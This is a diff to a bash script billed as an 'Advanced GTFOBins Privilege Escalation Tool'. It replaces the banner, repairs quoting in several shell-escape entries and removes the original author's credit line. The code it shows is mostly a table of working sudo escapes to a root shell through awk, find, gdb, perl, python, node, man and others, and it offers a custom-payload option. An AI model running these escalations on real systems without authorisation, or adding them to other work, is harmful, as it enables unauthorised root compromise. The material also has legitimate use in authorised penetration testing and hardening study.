@@ -26,19 +26,20 @@ CUSTOM_PAYLOAD="" # Custom payload to execute instead of /bin/sh
 # Banner
 show_banner() {
   cat << "EOF"
-  _____ _______ ______ ____  ____  _             
- / ____|__   __|  ____/ __ \|  _ \(_)            
-| |  __   | |  | |__ | |  | | |_) |_ _ __  ___   
-| | |_ |  | |  |  __|| |  | |  _ <| | '_ \/ __|  
-| |__| |  | |  | |   | |__| | |_) | | | | \__ \  
- \_____|  |_|  |_|    \____/|____/|_|_| |_|___/  
-                                                  
- _____ _____  _____            ______  _____  _____ 
-|  __ \_   _|/ ____|          |  ____|/ ____|/ ____|
-| |__) || | | (___   ___  ___| |__  | (___ | |     
-|  ___/ | |  \___ \ / _ \/ __|  __|  \___ \| |     
-| |    _| |_ ____) |  __/ (__| |____ ____) | |____ 
-|_|   |_____|_____/ \___|\___|______|_____/ \_____|
+
+     _         _                           
+    / \  _   _| |_ ___                     
+   / _ \| | | | __/ _ \                    
+  / ___ \ |_| | || (_) |                   
+ /_/   \_\__,_|\__\___/          
+           
+   ____ _____ _____ ___  ____  _           
+  / ___|_   _|  ___/ _ \| __ )(_)_ __  ___ 
+ | |  _  | | | |_ | | | |  _ \| | '_ \/ __|
+ | |_| | | | |  _|| |_| | |_) | | | | \__ \
+  \____| |_| |_|   \___/|____/|_|_| |_|___/
+                                           
+
                                                     
 EOF
   echo -e "${BOLD}${CYAN}[*] Advanced GTFOBins Privilege Escalation Tool v2.0${NC}"
@@ -223,7 +224,7 @@ declare -A GTFO_METHODS
 # Initialize GTFOBins methods
 initialize_gtfobins() {
   # Shell execution methods
-  GTFO_METHODS[awk]='sudo awk \'BEGIN {system("/bin/sh")}\''
+  GTFO_METHODS[awk]="sudo awk 'BEGIN {system(\"/bin/sh\")}'"
   GTFO_METHODS[bash]='sudo bash'
   GTFO_METHODS[busybox]='sudo busybox sh'
   GTFO_METHODS[capsh]='sudo capsh --gid=0 --uid=0 --'
@@ -233,7 +234,7 @@ initialize_gtfobins() {
   GTFO_METHODS[expect]='sudo expect -c "spawn /bin/sh;interact"'
   GTFO_METHODS[find]='sudo find / -exec /bin/sh \; -quit'
   GTFO_METHODS[flock]='sudo flock -u / /bin/sh'
-  GTFO_METHODS[gawk]='sudo gawk \'BEGIN {system("/bin/sh")}\''  
+  GTFO_METHODS[gawk]="sudo gawk 'BEGIN {system(\"/bin/sh\")}'"  
   GTFO_METHODS[gdb]='sudo gdb -nx -ex "!sh" -ex quit'
   GTFO_METHODS[ionice]='sudo ionice /bin/sh'
   GTFO_METHODS[ksh]='sudo ksh'
@@ -241,12 +242,12 @@ initialize_gtfobins() {
   GTFO_METHODS[logsave]='sudo logsave /dev/null /bin/sh'
   GTFO_METHODS[lua]='sudo lua -e "os.execute(\"/bin/sh\")"'
   GTFO_METHODS[man]='sudo man -P "/bin/sh" man'
-  GTFO_METHODS[mawk]='sudo mawk \'BEGIN {system("/bin/sh")}\''  
+  GTFO_METHODS[mawk]="sudo mawk 'BEGIN {system(\"/bin/sh\")}'"
   GTFO_METHODS[nice]='sudo nice /bin/sh'
   GTFO_METHODS[node]='sudo node -e "require(\"child_process\").exec(\"/bin/sh\")"'
   GTFO_METHODS[perl]='sudo perl -e "exec \"/bin/sh\""'
   GTFO_METHODS[php]='sudo php -r "system(\"/bin/sh\");"'
-  GTFO_METHODS[python]='sudo python -c "import os; os.system(\'/bin/sh\')"'
+  GTFO_METHODS[python]='sudo python -c "import os; os.system(\"/bin/sh\")"'
   GTFO_METHODS[ruby]='sudo ruby -e "exec \"/bin/sh\""'
   GTFO_METHODS[setarch]='sudo setarch $(arch) /bin/sh'
   GTFO_METHODS[stdbuf]='sudo stdbuf -i0 /bin/sh'
@@ -557,7 +558,6 @@ main() {
         echo "  --payload 'CMD'      Use custom payload instead of /bin/sh"
         echo "  -h, --help           Show this help message"
         echo ""
-        echo "Created by Mrx0rd (https://github.com/Wael-Rd)"
         exit 0
         ;;
       *)
